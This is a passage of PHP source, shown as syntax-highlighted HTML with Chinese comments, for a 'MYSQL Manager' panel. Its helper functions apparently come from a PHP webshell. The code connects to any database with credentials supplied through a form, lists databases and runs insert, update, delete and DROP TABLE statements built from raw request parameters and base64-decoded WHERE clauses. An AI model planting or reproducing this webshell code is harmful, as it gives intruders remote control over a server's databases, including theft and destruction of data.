<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">keystr</span> .= $<span style="color: #ffcc66;">tmp</span><span style="color: #f2777a; font-weight: bold;">.</span>$<span style="color: #ffcc66;">key</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">valstr</span> .= $<span style="color: #ffcc66;">tmp</span>.<span style="color: #66cccc;">"'"</span>.<span style="color: #cccccc; background-color: #2d2d2d;">addslashes(</span>$<span style="color: #ffcc66;">val</span>).<span style="color: #66cccc;">"'"</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tmp</span> = <span style="color: #66cccc;">','</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">keystr</span> &amp;&amp; $<span style="color: #ffcc66;">valstr</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mysqllink</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mydbconn(</span>$<span style="color: #ffcc66;">dbhost</span>,$<span style="color: #ffcc66;">dbuser</span>,$<span style="color: #ffcc66;">dbpass</span>,$<span style="color: #ffcc66;">dbname</span>,$<span style="color: #ffcc66;">charset</span>,$<span style="color: #ffcc66;">dbpo</span><span style="color: #ffcc66; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(q(</span><span style="color: #66cccc;">"INSERT INTO $tablename ($keystr) VALUES ($valstr)"</span>) ? <span style="color: #66cccc;">'Insert n</span><span style="color: #66cccc; text-decoration: underline;">ew record of success'</span><span style="text-decoration: underline;"> : </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">update</span> &amp;&amp; $<span style="color: #ffcc66;">insertsql</span> &amp;&amp; $<span style="color: #ffcc66;">base64</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">valstr</span> = $<span style="color: #ffcc66;">tmp</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">insertsql</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">key</span> =&gt; $<span style="color: #ffcc66;">val</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">valstr</span> .= $<span style="color: #ffcc66;">tmp</span><span style="color: #f2777a; font-weight: bold;">.</span>$<span style="color: #ffcc66;">key</span>.<span style="color: #66cccc;">"='"</span>.<span style="color: #cccccc; background-color: #2d2d2d;">addslashes(</span>$<span style="color: #ffcc66;">val</span>).<span style="color: #66cccc;">"'"</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tmp</span> = <span style="color: #66cccc;">','</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">valstr</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">where</span> = <span style="color: #cccccc; background-color: #2d2d2d;">base64_decode(</span>$<span style="color: #ffcc66;">base64</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mysqllink</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mydbconn(</span>$<span style="color: #ffcc66;">dbhost</span>,$<span style="color: #ffcc66;">dbuser</span>,$<span style="color: #ffcc66;">dbpass</span>,$<span style="color: #ffcc66;">dbname</span>,$<span style="color: #ffcc66;">charset</span>,$<span style="color: #ffcc66;">dbpo</span><span style="color: #ffcc66; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(q(</span><span style="color: #66cccc;">"UPDATE $tablename SET $valstr WHERE $where LIMIT 1"</span>) ? <span style="color: #66cccc;">'Record </span><span style="color: #66cccc; text-decoration: underline;">updating'</span><span style="text-decoration: underline;"> : </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'del'</span> &amp;&amp; $<span style="color: #ffcc66;">base64</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">where</span> = <span style="color: #cccccc; background-color: #2d2d2d;">base64_decode(</span>$<span style="color: #ffcc66;">base64</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">delete_sql</span> = <span style="color: #66cccc;">"DELETE FROM $tablename WHERE $where"</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mysqllink</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mydbconn(</span>$<span style="color: #ffcc66;">dbhost</span>,$<span style="color: #ffcc66;">dbuser</span>,$<span style="color: #ffcc66;">dbpass</span>,$<span style="color: #ffcc66;">dbname</span>,$<span style="color: #ffcc66;">charset</span>,$<span style="color: #ffcc66;">dbport</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(q(</span><span style="color: #66cccc;">"DELETE FROM $tablename WHERE $where"</span>) ? <span style="color: #66cccc;">'Deletion record of success</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;"> : </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">tablename</span> &amp;&amp; $<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'drop'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mysqllink</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mydbconn(</span>$<span style="color: #ffcc66;">dbhost</span>,$<span style="color: #ffcc66;">dbuser</span>,$<span style="color: #ffcc66;">dbpass</span>,$<span style="color: #ffcc66;">dbname</span>,$<span style="color: #ffcc66;">charset</span>,$<span style="color: #ffcc66;">dbport</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"DROP TABLE $tablename"</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Drop table of success'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tablename</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(mysql_error(</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'MYSQL Manager'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'mysqladmin'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'DBHost:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'dbhost'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">20</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">dbhost</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">':'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'dbport'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">4</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">dbport</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'DBUser:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'dbuser'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">15</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">dbuser</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'DBPass:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'dbpass'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">15</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">dbpass</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'DBCharset:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeselect(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'charset'</span>,<span style="color: #66cccc;">'option'</span>=&gt;$<span style="color: #ffcc66;">charsetdb</span>,<span style="color: #66cccc;">'selected'</span>=&gt;$<span style="color: #ffcc66;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'connect'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #66cccc;">'Connect'</span>,<span style="color: #66cccc;">'type'</span>=&gt;<span style="color: #66cccc;">'submit'</span>,<span style="color: #66cccc;">'class</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #66cccc; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#25805;&#20316;&#35760;&#24405;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'recordlist'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'doing'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'mysqladmin'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'base64'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'tablename'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">dbform</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#36873;&#23450;&#25968;&#25454;&#24211;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'setdbname'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'mysqladmin'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">dbform</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!$<span style="color: #ffcc66;">dbname</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dbname'</span>);
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);

<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#36873;&#23450;&#34920;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'settable'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'mysqladmin'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span>$<span style="color: #ffcc66;">dbform</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'tablename'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'page'</span>,$<span style="color: #ffcc66;">page</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'doing'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);

<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">cachetables</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);<span style="color: #f2777a; background-color: #515151;">     </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">pagenum</span> = <span style="color: #cccccc; background-color: #2d2d2d;">30</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">page</span> = <span style="color: #cccccc; background-color: #2d2d2d;">intval(</span>$<span style="color: #ffcc66;">page</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">page</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">start_limit</span> = ($<span style="color: #ffcc66;">page</span> - <span style="color: #cccccc; background-color: #2d2d2d;">1</span>) * $<span style="color: #ffcc66;">pagenum</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">start_limit</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">page</span> = <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #ffcc66;">dbhost</span>) &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #ffcc66;">dbuser</span>) &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #ffcc66;">dbpass</span>) &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #ffcc66;">connect</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mysqllink</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mydbconn(</span>$<span style="color: #ffcc66;">dbhost</span>, $<span style="color: #ffcc66;">dbuser</span>, $<span style="color: #ffcc66;">dbpass</span>, $<span style="color: #ffcc66;">dbname</span>, $<span style="color: #ffcc66;">charset</span>, $<span style="color: #ffcc66;">dbp</span><span style="color: #ffcc66; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;&#20449;&#24687;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mysqlver</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_get_server_info(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;MySQL '</span>.$<span style="color: #ffcc66;">mysqlver</span>.<span style="color: #66cccc;">' running in '</span>.$<span style="color: #ffcc66;">dbhost</span>.<span style="color: #66cccc;">' as '</span>.$<span style="color: #ffcc66;">dbuser</span>.<span style="color: #66cccc;">'@'</span>.$<span style="color: #ffcc66;">dbhos</span><span style="color: #ffcc66; text-decoration: underline;">t</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">highver</span> = $<span style="color: #ffcc66;">mysqlver</span> &gt; <span style="color: #66cccc;">'4.1'</span> ? <span style="color: #cccccc; background-color: #2d2d2d;">1</span> : <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;

<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">query</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"SHOW DATABASES"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dbs</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dbs</span>[] = <span style="color: #66cccc;">'-- Select a database --'</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span>($<span style="color: #ffcc66;">db</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_array(</span>$<span style="color: #ffcc66;">query</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dbs</span>[$<span style="color: #ffcc66;">db</span>[<span style="color: #66cccc;">'Database'</span>]] = $<span style="color: #ffcc66;">db</span>[<span style="color: #66cccc;">'Database'</span>];
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeselect(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Please select a database:'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'db[]'</span>,<span style="color: #66cccc;">'op</span><span style="color: #66cccc; text-decoration: underline;">tion'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffcc66; text-decoration: underline;">dbs</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffcc66; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'onchange'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #66cccc; text-decoration: underline;">'moddbname(this.options[this.selectedIndex].value)'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tabledb</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">dbname</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'Current dababase: &lt;a href="javascript:moddbname(\''</span>.$<span style="color: #ffcc66;">dbname</span>.<span style="color: #66cccc;">'\');</span><span style="color: #66cccc; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">tablename</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">' | Current Table: &lt;a href="javascript:settable(\''</span>.$<span style="color: #ffcc66;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt; [ &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt; ]'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">mysql_select_db(</span>$<span style="color: #ffcc66;">dbname</span>);

<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">getnumsql</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">runquery</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">sql_query</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">runquery</span> = <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">allowedit</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">tablename</span> &amp;&amp; !$<span style="color: #ffcc66;">sql_query</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">sql_query</span> = <span style="color: #66cccc;">"SELECT * FROM $tablename"</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">getnumsql</span> = $<span style="color: #ffcc66;">sql_query</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">sql_query</span> = $<span style="color: #ffcc66;">sql_query</span>.<span style="color: #66cccc;">" LIMIT $start_limit, $pagenum"</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">allowedit</span> = <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;form action="'</span>.$<span style="color: #ffcc66;">self</span>.<span style="color: #66cccc;">'" method="POST"&gt;'</span>);
